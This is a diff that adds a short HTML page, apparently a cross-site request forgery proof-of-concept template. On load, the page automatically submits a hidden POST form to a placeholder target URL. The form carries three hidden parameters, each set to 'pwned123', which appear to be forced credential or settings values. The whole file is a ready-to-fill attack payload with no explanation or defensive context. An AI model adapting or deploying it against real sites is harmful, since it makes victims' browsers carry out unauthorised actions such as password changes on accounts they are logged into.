@@ -1,0 +1,10 @@
+<!doctype html>
+<html>
+  <body onload="document.forms[0].submit()">
+    <form action="http://host:port/dir?param=val" method="POST">
+      <input type="hidden" name="param1" value="pwned123">
+      <input type="hidden" name="param2" value="pwned123">
+      <input type="hidden" name="param3" value="pwned123">
+    </form>
+  </body>
+</html>
